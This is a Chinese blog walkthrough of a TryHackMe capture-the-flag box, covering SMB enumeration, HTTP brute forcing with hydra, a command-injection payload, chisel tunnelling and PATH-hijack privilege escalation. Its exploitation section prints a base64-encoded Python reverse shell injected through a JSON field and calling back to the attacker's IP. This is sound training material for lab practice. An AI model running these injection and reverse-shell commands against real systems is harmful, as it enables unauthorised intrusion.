@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="靶场概述难度： hard描述：千万别小看狡猾的老狐狸……你能躲过狡猾的狐狸吗？  基本信息   🚀 本地机器信息 目标机器信息    IP 10.17.5.121 10.10.206.5   OS kali Linux    信息搜集端口扫描 1234PORT    STATE SERVICE      REASON80&#x2F;tcp  open  http         syn-ack139&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="thm-otf">
+<meta property="og:url" content="https://imli.ink/2024/11/25/yotf/index.html">
+<meta property="og:site_name" content="安全杂谈 | 网络安全、渗透测试、信息安全技术分享">
+<meta property="og:description" content="靶场概述难度： hard描述：千万别小看狡猾的老狐狸……你能躲过狡猾的狐狸吗？  基本信息   🚀 本地机器信息 目标机器信息    IP 10.17.5.121 10.10.206.5   OS kali Linux    信息搜集端口扫描 1234PORT    STATE SERVICE      REASON80&#x2F;tcp  open  http         syn-ack139&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241126000314.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241126000730.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241126001226.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241126003656.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241126000430.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241126005148.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241126010109.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241126011326.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241126011416.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241126013254.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241126013559.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241126013748.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241126014336.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241126014324.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241126014426.png">
+<meta property="article:published_time" content="2024-11-25T15:58:59.437Z">
+<meta property="article:modified_time" content="2024-11-25T15:58:59.437Z">
+<meta property="article:author" content="Leon">
+<meta property="article:tag" content="靶场">
+<meta property="article:tag" content="THM">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://imli.ink/assets/img/Pasted%20image%2020241126000314.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>thm-otf</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-3YLDTM3C61"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-3YLDTM3C61');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="安全杂谈 | 网络安全、渗透测试、信息安全技术分享" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/sites/">站点</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2024/11/26/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/11/24/dailybugle/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://imli.ink/2024/11/25/yotf/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://imli.ink/2024/11/25/yotf/&text=thm-otf"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://imli.ink/2024/11/25/yotf/&title=thm-otf"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://imli.ink/2024/11/25/yotf/&is_video=false&description=thm-otf"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=thm-otf&body=Check out this article: https://imli.ink/2024/11/25/yotf/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://imli.ink/2024/11/25/yotf/&title=thm-otf"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://imli.ink/2024/11/25/yotf/&title=thm-otf"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://imli.ink/2024/11/25/yotf/&title=thm-otf"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://imli.ink/2024/11/25/yotf/&title=thm-otf"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://imli.ink/2024/11/25/yotf/&name=thm-otf&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://imli.ink/2024/11/25/yotf/&t=thm-otf"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">靶场概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">2.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F"><span class="toc-number">4.</span> <span class="toc-text">攻击向量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E5%9B%9E%E9%A1%BE"><span class="toc-number">7.</span> <span class="toc-text">知识点回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        thm-otf
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Leon</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-25T15:58:59.437Z" class="dt-published" itemprop="datePublished">2024-11-25</time>
+        
+        (Updated: <time datetime="2024-11-25T15:58:59.437Z" class="dt-updated" itemprop="dateModified">2024-11-25</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/THM/" rel="tag">THM</a>, <a class="p-category" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote>
+</blockquote>
+<h2 id="靶场概述"><a href="#靶场概述" class="headerlink" title="靶场概述"></a>靶场概述</h2><p>难度： hard<br>描述：千万别小看狡猾的老狐狸……<br>你能躲过狡猾的狐狸吗？</p>
+<hr>
+<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table>
+<thead>
+<tr>
+<th>🚀</th>
+<th>本地机器信息</th>
+<th>目标机器信息</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>IP</td>
+<td>10.17.5.121</td>
+<td>10.10.206.5</td>
+</tr>
+<tr>
+<td>OS</td>
+<td>kali</td>
+<td>Linux</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>端口扫描<br><a href="/../assets/img/Pasted%20image%2020241126000314.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126000314.png"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE SERVICE      REASON</span><br><span class="line">80/tcp  open  http         syn-ack</span><br><span class="line">139/tcp open  netbios-ssn  syn-ack</span><br><span class="line">445/tcp open  microsoft-ds syn-ack</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p><strong>80&#x2F;tcp (HTTP)</strong>:</p>
+<ul>
+<li><strong>Web服务漏洞</strong>：端口80通常用于HTTP服务，如果该端口上有Web服务运行，可能存在Web应用漏洞（如SQL注入、跨站脚本攻击XSS、文件上传漏洞等）。</li>
+<li><strong>远程代码执行</strong>：Web服务如果存在漏洞（如未修补的CMS、脆弱的Web框架等），攻击者可能利用漏洞实现远程代码执行。</li>
+<li><strong>信息泄露</strong>：HTTP服务也可能泄露服务器的敏感信息，如错误信息、配置文件、数据库信息等，提供攻击者进一步入侵的线索。</li>
+</ul>
+</li>
+<li><p><strong>139&#x2F;tcp (NetBIOS-SSN)</strong>:</p>
+<ul>
+<li><strong>NetBIOS&#x2F;SMB漏洞</strong>：端口139是与Windows网络共享和文件共享相关的NetBIOS服务。攻击者可以通过这个端口利用诸如<strong>EternalBlue</strong>等漏洞攻击Windows机器，进行远程代码执行。</li>
+<li><strong>SMB协议漏洞</strong>：如果服务器使用较旧的SMB协议（如SMBv1），攻击者可能利用SMB协议中的已知漏洞（如<strong>MS17-010</strong>）来发起攻击。</li>
+</ul>
+</li>
+<li><p><strong>445&#x2F;tcp (Microsoft-DS)</strong>:</p>
+<ul>
+<li><strong>SMB远程代码执行漏洞</strong>：端口445用于Microsoft的SMB协议，是攻击者常用的目标。如果存在未修补的漏洞，尤其是<strong>EternalBlue</strong>等著名漏洞，攻击者可以利用这个漏洞进行远程代码执行。</li>
+<li><strong>暴力破解和身份验证绕过</strong>：如果SMB服务没有正确配置，攻击者可能通过暴力破解或枚举用户</li>
+</ul>
+</li>
+</ol>
+<p><a href="/../assets/img/Pasted%20image%2020241126000730.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126000730.png"></a></p>
+<p>配置hosts</p>
+<p><a href="/../assets/img/Pasted%20image%2020241126001226.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126001226.png"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 10.10.206.5 -U</span><br></pre></td></tr></table></figure>
+
+<p>获取到了<br><a href="/../assets/img/Pasted%20image%2020241126003656.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126003656.png"></a><br>fox和rascal</p>
+<p>80端口需要配置<br><a href="/../assets/img/Pasted%20image%2020241126000430.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126000430.png"></a></p>
+<h2 id="攻击向量"><a href="#攻击向量" class="headerlink" title="攻击向量"></a>攻击向量</h2><p>可以尝试进行密码爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user -P /usr/share/wordlists/rockyou.txt 10.10.206.5 http-get</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rascal</span><br></pre></td></tr></table></figure>
+
+
+<p><a href="/../assets/img/Pasted%20image%2020241126005148.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126005148.png"></a></p>
+<p><a href="/../assets/img/Pasted%20image%2020241126010109.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126010109.png"></a></p>
+<ol>
+<li><p><code>\&quot;;/usr/bin/id\n </code> 这个</p>
+<p> 这个字符串 <code>\&quot;;/usr/bin/id\n</code> 看起来像是一个试图在命令行中执行命令注入的payload。</p>
+<ol>
+<li><p>**<code>\&quot;</code>**：</p>
+<ul>
+<li>这个字符是转义的双引号 (<code>\&quot;</code>)，它的作用是结束当前的字符串或命令参数。这通常用来突破命令的语法结构，并可能结束一个命令或字符串参数，使攻击者能够插入自己的命令。</li>
+</ul>
+</li>
+<li><p>**<code>;</code>**：</p>
+<ul>
+<li>这是命令分隔符。在Unix和Linux系统中，<code>；</code>（分号）用于分隔不同的命令。在命令注入中，攻击者可以通过插入分号来结束当前的命令并开始执行新的命令。</li>
+</ul>
+</li>
+<li><p>**<code>/usr/bin/id</code>**：</p>
+<ul>
+<li>这是Linux&#x2F;Unix系统中的一个命令，<code>id</code> 命令用于显示当前用户的身份信息，包括用户ID（UID）、组ID（GID）等。</li>
+<li>攻击者可能希望通过注入此命令来查看当前用户的权限或获取敏感信息。</li>
+</ul>
+</li>
+<li><p>**<code>\n</code>**：</p>
+<ul>
+<li>这是换行符，通常表示命令结束并换到新的一行，通常在多行命令中用来表示结束。</li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;target&quot;:&quot;\&quot;;echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTcuNS4xMjEiLDQ0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJzaCIpJw==|base64 -d|bash\n&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p><a href="/../assets/img/Pasted%20image%2020241126011326.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126011326.png"></a></p>
+<p><a href="/../assets/img/Pasted%20image%2020241126011416.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126011416.png"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel server -p 8081 --reverse</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@year-of-the-fox:/tmp$ ./ch client 10.17.5.121:8081 R:10.17.5.121:2222:localhost:22</span><br></pre></td></tr></table></figure>
+<p><a href="/../assets/img/Pasted%20image%2020241126013254.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126013254.png"></a></p>
+<p><a href="/../assets/img/Pasted%20image%2020241126013559.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126013559.png"></a><br><a href="/../assets/img/Pasted%20image%2020241126013748.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126013748.png"></a></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fox@year-of-the-fox:~$ sudo -l</span><br><span class="line">Matching Defaults entries for fox on year-of-the-fox:</span><br><span class="line">    env_reset, mail_badpass</span><br><span class="line"></span><br><span class="line">User fox may run the following commands on year-of-the-fox:</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/shutdown</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在目标机器上开启http服务，下载shutdown,发现他调用了poweroff,且没有使用绝对路径</p>
+<p><a href="/../assets/img/Pasted%20image%2020241126014336.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126014336.png"></a><br><a href="/../assets/img/Pasted%20image%2020241126014324.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126014324.png"></a><br><a href="/../assets/img/Pasted%20image%2020241126014426.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126014426.png"></a></p>
+<h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/sites/">站点</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">项目</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">靶场概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">2.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F"><span class="toc-number">4.</span> <span class="toc-text">攻击向量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E5%9B%9E%E9%A1%BE"><span class="toc-number">7.</span> <span class="toc-text">知识点回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://imli.ink/2024/11/25/yotf/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://imli.ink/2024/11/25/yotf/&text=thm-otf"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://imli.ink/2024/11/25/yotf/&title=thm-otf"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://imli.ink/2024/11/25/yotf/&is_video=false&description=thm-otf"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=thm-otf&body=Check out this article: https://imli.ink/2024/11/25/yotf/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://imli.ink/2024/11/25/yotf/&title=thm-otf"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://imli.ink/2024/11/25/yotf/&title=thm-otf"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://imli.ink/2024/11/25/yotf/&title=thm-otf"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://imli.ink/2024/11/25/yotf/&title=thm-otf"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://imli.ink/2024/11/25/yotf/&name=thm-otf&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://imli.ink/2024/11/25/yotf/&t=thm-otf"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+      
+        
+          2016-2024
+            Leon
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       -->
+          <li><a href="/">
+              首页
+            </a></li><!--
+     -->
+          <!--
+       -->
+          <li><a href="/archives/">
+              归档
+            </a></li><!--
+     -->
+          <!--
+       -->
+          <li><a href="/tags/">
+              标签
+            </a></li><!--
+     -->
+          <!--
+       -->
+          <li><a href="/sites/">
+              站点
+            </a></li><!--
+     -->
+          <!--
+       -->
+          <li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">
+              项目
+            </a></li><!--
+     -->
+          <!--
+       -->
+          <li><a href="/search/">
+              搜索
+            </a></li><!--
+     -->
+          <!--
+       -->
+          <li><a href="/about/">
+              关于
+            </a></li><!--
+     -->
+          
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-center">
+    
+      <!-- 不蒜子统计 -->
+      <span id="busuanzi_container_site_pv">
+        总访问量<span id="busuanzi_value_site_pv"></span>次
+      </span>
+      <span class="post-meta-divider">|</span>
+      <span id="busuanzi_container_site_uv" style='display:none'>
+        访客数<span id="busuanzi_value_site_uv"></span>人
+      </span>
+      <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+      
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'leonooo13/Talk';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'photon-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
